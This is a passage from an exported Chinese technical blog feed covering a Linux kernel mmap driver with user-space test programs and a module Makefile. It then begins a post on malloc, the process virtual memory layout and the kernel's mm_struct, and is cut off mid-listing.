class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_PAGE_COUNT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN (MAP_PAGE_COUNT * 4096)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/mmap_driver_dev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *vadr = mmap(<span class="number">0</span>, LEN, PROT_READ, MAP_PRIVATE | MAP_LOCKED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> loop = <span class="number">0</span>; loop &lt; MAP_PAGE_COUNT; loop++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%-10s----%lx]\n&quot;</span>, vadr + <span class="number">4096</span> * loop, (<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)vadr + <span class="number">4096</span> * loop);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">//便于查看调试的时候查看进程pid</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="maptest-write-c"><a href="#maptest-write-c" class="headerlink" title="maptest_write.c"></a>maptest_write.c</h3><p>​下面是我们用户空间的写程序，向第一个页面写入一个字符串。mmap 参数：可读，可写，共享，加锁（防止被换出）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN (10 * 4096)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/mmap_driver_dev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *vadr = mmap(<span class="number">0</span>, LEN, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_LOCKED, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input the info to Page0:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, vadr);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><blockquote><p>这里只需要强调一点就是，内核编译默认采用 C90 标准，所以某些语法会导致 make 报错，解决的方法可以是在 Makefile 文件里添加进这句话<code>ccflags-y := -std=gnu99 -Wno-declaration-after-statement</code>。（比如在阅读很多开源内核模块时可能发现所有变量定义都是统一放在函数开头的，这就是 C90 的一个特点）</p></blockquote><p><img src="https://s2.loli.net/2023/01/12/3ScKFZluzn9Bri5.png" alt="c90编译内核.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_MODULE_SIG := n</span><br><span class="line">ccflags-y := -std=gnu99 -Wno-declaration-after-statement</span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m += map_driver.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">KERNELDIR ?= /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">default:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span>  M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">@rm -rf *.o *.mod *.mod.c *.mod.o *.ko *.order *.symvers .*.cmd .tmp_versions</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><blockquote><p>此外想强调一点，就是 printk 进行内核打印日志时，打印的字符串末尾一定要加换行符 \n ，否则可能因为缓冲区问题导致无法正常打印，而自己还以为是程序本身有 bug 出错。</p></blockquote><p>​到这里这一章所有的故事就讲完了，我自己从写代码，各种 bug 调试到完成该文章也是搞了整整三天，收获还是很大的，这篇应该还算写的蛮详细了，语言表达上也是反复斟酌。最后，所有代码都放在 Gitee上了 <a href="https://gitee.com/ChaceQ/linuxk_blog_code.git">linuxk_blog_code1 </a>，希望对友友们有帮助！</p><hr><h2 id="踩坑补充"><a href="#踩坑补充" class="headerlink" title="踩坑补充"></a>踩坑补充</h2><ol><li><p>模块退出函数里的这两句一定不能写反了，否则在卸载模块时会内核崩溃，提示<code>ERROR: Module is in use.</code>导致该模块无法被卸载，查看内核日志发现是 <code>device_del(my_device);</code>函数里出现空指针异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">device_del(my_device);</span><br><span class="line">class_destroy(my_class);</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2023/01/12/MEzu5V6x4Y1SrWv.png" alt="image.png"></p><ol start="2"><li><p>执行主程序时一定要加管理员权限<code>sudo ./maptest_read</code>，因为我们创建的设备文件是仅 root 用户才能打开的，所以不加管理员权限直接运行程序会报错，一不小心就可能将问题重心转向排查是否设备文件本身出错。</p><p><img src="https://s2.loli.net/2023/01/12/k4js9oRAYviTa7t.png" alt="image.png"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc内存管理浅析一 - 前奏</title>
      <link href="/2022/12/28/02malloc_1/"/>
      <url>/2022/12/28/02malloc_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在当时做编译器项目的时候，由于自己负责汇编代码生成及优化这一块，其中自然要去考虑各个段的虚拟空间布局问题，所以自己去浅了解了一下关于 Linux 内存分配的相关知识。毫不夸张地说，了解 Linux 的堆内存分配机制是通向进一步学习操作系统的必经之路。以下，第一章节先浅浅写个前置知识回顾虚拟空间布局基本原理，往后再进一步探索 malloc 相关源码。</p></blockquote><h2 id="第一部分-Linux虚拟内存空间"><a href="#第一部分-Linux虚拟内存空间" class="headerlink" title="第一部分 - Linux虚拟内存空间"></a>第一部分 - Linux虚拟内存空间</h2><p>​我们的故事要从这张图片说起，这是 Linux 进程虚拟地址空间的布局图。在32位系统下虚拟空间有4GB (2^32)，其中1GB作为所有进程共享的内核空间（下图左，即无论有多少个进程，该内核空间映射在物理空间中只有一份，由所有进程共享），而3GB作为每个进程独占的用户空间（下图右）。Linux 系统在准备运行 elf 格式的程序文件时，会调用加载器 loader 把可执行文件中的各个段依次载入到从某一地址开始的空间中。</p><p>​如下图右所示，在这3GB的用户空间中，高地址作为函数调用栈 stack，在程序运行过程中向低地址方向增长，低地址开始依次是保留区，.text .rodata .init段，.data .bss段，再往上便是堆 heap 以及 memory mapping segment 映射区。</p><p><img src="https://s2.loli.net/2022/12/28/LsGvSXgwTRdiymF.png" alt="Linux内存布局.png"></p><ul><li><p>栈区：上图虽只画了一个stack区，但若同一进程下有多线程，那么就会有多个互相独立的 stack 区，Linux 下每个线程栈最大值默认 8 MB，可以用 <code>ulimit -s</code>查看，他们都分布在用户空间的相对高地址区域，向下增长。</p></li><li><p>.text段：代码段，存储只读的程序执行代码，即机器指令。程序运行过程中 pc 指针指向该区域对应执行（取指）的代码。</p></li><li><p>.rodata段：只读数据段，通常存放类似 <code>char *str = &quot;helloworld&quot;</code>的字符串以及 const 修饰的全局变量。</p></li><li><p>.data段：数据段，通常存放初始化过的全局及静态变量。</p></li><li><p>.bss段：未初始化全局及静态变量段。若源文件中定义了 <code>char arr[10000];</code>而并未初始化，那么生成的可执行文件中并不会占用10000字节的存储空间而仅仅是做个大小标记。而是在程序执行的时候分配空间，并且全部初始化为0。</p><p>​我们在使用 malloc() 进行动态内存分配时，底层实现会有两条分配路线，当 malloc 申请小于128KB空间时，操作系统提供了 brk() 函数，c运行库提供了sbrk() 函数，在 heap 区域进行分配。而在申请超过128KB的堆内存，或者程序运行过程中有所需要打开的文件以及动态链接库文件，操作系统提供了 mmap() 函数和 munmap() 函数，分配的内存会被映射到 mmap 区域。</p></li><li><p>heap : 堆区域。类似于栈的实现，mm-&gt;start_brk 指针始终指向 heap 的底部用于标记 heap 区域的开始位置，而 heap 顶部有个 mm-&gt;brk 指针，通过该指针的上下移动便可以分配堆内存。该方案适用于分配小块内存，因为类似于栈的实现形式，若高地址的内存未被释放，brk 指针便不会下移，这可能导致低地址已经释放的内存无法归还造成内存碎片。</p></li><li><p>mmap：匿名映射区。该部分占用整个虚拟内存的绝大部分空间。补充：在Linux2.6以前采用 legacy layout 布局，该区域 mmap 起始位置大概在0X40000000处，向上增长约有2GB的空间，该方案 heap 与 mmap 区域无法共享内存。新版 modern layout 布局 mmap 起始位置大概在0XBFxxxxxx处，向下增长，与 heap 区相对，总共大概有2.9GB的可分配空间。</p><blockquote><p>​补充个小知识点，在上图中我们能看到一些 Random offest ，比如 stack 域和 mmap 域之间的 Random mmap offset，为什么会有这些空洞呢，其实是因为如果各个段都采用固定的起始地址，这样实现起来简单，而且所有 Linux 系统都能保持统一，但是对于攻击者来说，构建恶意代码（比如通过缓冲区溢出获得栈内存区域的访问权，进而恶意操纵栈的内容）就变得更加容易。因此一个可以采用的反制措施就是不为这些 segments 的起点选择固定位置，而是在每次新进程启动时（通过设置PF_RANDOMIZE标志）随机改变这些值的设置，这也就形成了一系列的 Random offest 间隙。</p></blockquote><blockquote><p>​值得一提的是，无论是 malloc() 进行匿名内存分配还是在 mmap 区域的打开文件，加载时候均使用 “lazy” 的延迟分配策略。即分配虚拟地址空间时，并不会马上分配对应的物理内存并建立 mmu 映射，而是在虚拟地址真正读写时触发缺页异常，中断，在异常处理中再进行物理内存分配、数据读取和建立 mmu 映射。</p><p>​而在内核空间分配时不采用延时分配物理内存的策略，因为内核对文件的映射很少，一般就是 vmlinux，不会消耗太多内存资源。且内核空间的代码一般要求快速响应，缺页处理这种会让内核速度未知。此外，内核操作可能处于各种复杂的锁上下文中，在这种上下文中处理缺页异常，可能触发新的异常。</p></blockquote><p>实际mmap区域在映射过程中分为文件映射和匿名映射。</p><ol><li>文件映射: 磁盘文件映射到进程的虚拟地址空间，使用文件内容初始化物理内存。</li><li>匿名映射: 初始化全为0的内存空间，即通过malloc所申请的mmap内存区域。</li></ol><p>根据映射关系是否共享还可以分为私有映射和共享映射。</p><ol><li>私有映射(MAP_PRIVATE)：多进程间数据共享，通过copy-on-write（写时复制）机制实现数据修改。</li><li>共享映射(MAP_SHARED)：多进程间数据共享，修改会直接反映到磁盘里该实际文件中。</li></ol><p>总结起来，便有以下四种映射关系。</p><ol><li>私有文件映射：多个进程使用同样的物理内存页进行初始化，但是各个进程对内存文件的修改会通过写诗拷贝进行复制后修改。</li><li>共享文件映射：多个进程通过虚拟内存技术共享同样的物理内存空间，对内存文件的修改会反应到同一个实际物理文件中，也是进程间通信(IPC)的一种机制。</li><li>私有匿名映射：mmap会创建一个新的映射，各个进程不共享，这种使用主要用于大块malloc内存分配。例如在创建新进程时，会为每个进程分配虚拟的地址空间，这些虚拟地址映射的物理内存空间各个进程间读的时候共享，写的时候会copy-on-write。</li><li>共享匿名映射：这种机制在进行fork的时候不会采用写时复制，父子进程完全共享同样的物理内存页，这也就实现了父子进程通信(IPC)。</li></ol></li></ul><h2 id="第二部分-相关结构体代码实现"><a href="#第二部分-相关结构体代码实现" class="headerlink" title="第二部分 - 相关结构体代码实现"></a>第二部分 - 相关结构体代码实现</h2><p>​我们知道在Linux中每个进程都是由一个PCB（process control block 进程控制块）来表示的（实际上 Linux 里无论是进程还是线程甚至是内核线程的结构都是统一为该结构体表示），在操作系统里具体由 task_struct 结构体实现，在 task_struct 结构体有一个 <code>struct mm_struct *mm</code> 指针，这就是用于表示一个进程（线程）的虚拟内存空间的内存描述符结构体指针。我们来看一下 mm_struct的代码，该结构体包含了和进程地址空间有关的全部信息，其定义在 <code>&lt;linux/sched.h&gt;</code> 中。</p><p>​所有的 mm_struct 结构体都通过自身的 <code> struct list_head mmlist;</code> 连接在一个双向链表中，该链表的首元素是 init_mm 内存描述符，它代表 init （0号进程）的地址空间。此外注意，操作该链表时需要使用 mmlist_lock 锁来防止并发访问。下面就是 mm_struct 的结构体实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">//指向内存区域的链表头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span>       <span class="comment">/* list of VMAs */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//指向内存区域的红黑树根节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//指向最近使用的虚拟区间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span> <span class="comment">/* last find_vma result */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//用来在进程地址空间中搜索有效的进程地址空间的函数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> pgoff, <span class="type">unsigned</span> <span class="type">long</span> flags)</span>;</span><br><span class="line"></span><br><span class="line">       <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_exec_area)</span> <span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> pgoff, <span class="type">unsigned</span> <span class="type">long</span> flags)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放线性区时调用的方法，          </span></span><br><span class="line">    <span class="type">void</span> (*unmap_area) (<span class="keyword">struct</span> mm_struct *mm, <span class="type">unsigned</span> <span class="type">long</span> addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//标识第一个分配文件内存映射的线性地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_base;        <span class="comment">/* base of mmap area */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> task_size;        <span class="comment">/* size of task vm space */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * RHEL6 special for bug 790921: this same variable can mean</span></span><br><span class="line"><span class="comment">     * two different things. If sysctl_unmap_area_factor is zero,</span></span><br><span class="line"><span class="comment">     * this means the largest hole below free_area_cache. If the</span></span><br><span class="line"><span class="comment">     * sysctl is set to a positive value, this variable is used</span></span><br><span class="line"><span class="comment">     * to count how much memory has been munmapped from this process</span></span><br><span class="line"><span class="comment">     * since the last time free_area_cache was reset back to mmap_base.</span></span><br><span class="line"><span class="comment">     * This is ugly, but necessary to preserve kABI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cached_hole_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//内核进程搜索进程地址空间中线性地址的空间空间</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> free_area_cache;      <span class="comment">/* first hole of size cached_hole_size or larger */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//指向页表的目录</span></span><br><span class="line">    <span class="type">pgd_t</span> * pgd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//共享进程时的个数</span></span><br><span class="line">    <span class="comment">//比如:若9个线程共享该空间，则 mm_users为3，当其减为0时该结构体会被撤销。</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_users;          <span class="comment">/* How many users with user space? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//内存描述符的主使用计数器，采用引用计数的原理，当为0时代表无用户再次使用</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_count;          <span class="comment">/* How many references to &quot;struct mm_struct&quot; (users count as 1) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//线性区的个数</span></span><br><span class="line">    <span class="type">int</span> map_count;              <span class="comment">/* number of VMAs */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//保护任务页表和引用计数的锁</span></span><br><span class="line">    <span class="type">spinlock_t</span> page_table_lock;     <span class="comment">/* Protects page tables and some counters */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//mm_struct结构，第一个成员就是初始化的mm_struct结构，</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span>        <span class="comment">/* List of maybe swapped mm&#x27;s.  These are globally strung</span></span><br><span class="line"><span class="comment">                         * together off init_mm.mmlist, and are protected</span></span><br><span class="line"><span class="comment">                         * by mmlist_lock</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Special counters, in some configurations protected by the</span></span><br><span class="line"><span class="comment">     * page_table_lock, in other configurations by being atomic.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">mm_counter_t</span> _file_rss;</span><br><span class="line">    <span class="type">mm_counter_t</span> _anon_rss;</span><br><span class="line">    <span class="type">mm_counter_t</span> _swap_usage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程拥有的最大页表数目</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> hiwater_rss;  <span class="comment">/* High-watermark of RSS usage */</span>、</span><br><span class="line">    <span class="comment">//进程线性区的最大页表数目</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> hiwater_vm;   <span class="comment">/* High-water virtual memory usage */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程地址空间的大小，锁住无法换页的个数，共享文件内存映射的页数，可执行内存映射中的页数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">    <span class="comment">//用户态堆栈的页数，</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面几个值的范围就表示各个段的地址空间范围.</span></span><br><span class="line">    <span class="comment">//维护代码段和数据段</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_code, end_code, start_data, end_data;</span><br><span class="line">    <span class="comment">//维护堆和栈</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_brk, brk, start_stack;</span><br><span class="line">    <span class="comment">//维护命令行参数，命令行参数的起始地址和最后地址，以及环境变量的起始地址和最后地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> arg_start, arg_end, env_start, env_end;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="comment">/* for /proc/PID/auxv */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//lazy TLB交换掩码.</span></span><br><span class="line">    <span class="type">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Architecture-specific MM context */</span></span><br><span class="line">    <span class="type">mm_context_t</span> context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Swap token stuff */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Last value of global fault stamp as seen by this process.</span></span><br><span class="line"><span class="comment">     * In other words, this value gives an indication of how long</span></span><br><span class="line"><span class="comment">     * it has been since this task got the token.</span></span><br><span class="line"><span class="comment">     * Look at mm/thrash.c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> faultstamp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> token_priority;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> last_interval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//线性区的默认访问标志</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags; <span class="comment">/* Must use atomic bitops to access the bits */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> *<span class="title">core_state</span>;</span> <span class="comment">/* coredumping support */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AIO</span></span><br><span class="line">    <span class="type">spinlock_t</span>      ioctx_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>   <span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span></span><br><span class="line"><span class="comment">     * user/owner of this mm. All of the following must be true in</span></span><br><span class="line"><span class="comment">     * order for it to be changed:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * current == mm-&gt;owner</span></span><br><span class="line"><span class="comment">     * current-&gt;mm != mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;mm == mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;alloc_lock is held</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">    <span class="comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmu_notifier_mm</span> *<span class="title">mmu_notifier_mm</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page_table_lock */</span></span><br><span class="line"><span class="meta">#<span 